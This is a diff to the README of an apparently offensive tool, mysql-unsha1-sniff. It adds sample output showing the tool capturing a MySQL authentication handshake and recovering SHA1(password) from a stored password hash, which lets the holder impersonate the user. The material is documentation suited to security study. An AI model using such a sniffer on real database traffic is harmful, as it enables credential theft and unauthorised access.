@@ -109,6 +109,19 @@ In accordance with the previous example:
 
     sudo ./mysql-unsha1-sniff -i lo 127.0.0.1 3306 2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19:root
 
+Once a successful authentication handshake is captured the output will be like:
+
+    [+] Input:
+    [+] - username ........................ 'root'
+    [+] - salt ............................ 3274756c42415d3429717e482a3776704d706b49
+    [+] - client session password ......... 6d45a453b989ad0ff0c84daf623e9870f129c329
+    [+] - SHA1(SHA1(password)) ............ 2470c0c06dee42fd1618bb99005adca2ec9d1e19
+    [+] Output:
+    [+] - SHA1(password) .................. 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
+    [+] Check:
+    [+] - computed SHA1(SHA1(password)) ... 2470c0c06dee42fd1618bb99005adca2ec9d1e19
+    [+] - authentication status ........... OK
+
 If no account information are provided, the tool will only display the salt and
 the session password.
 
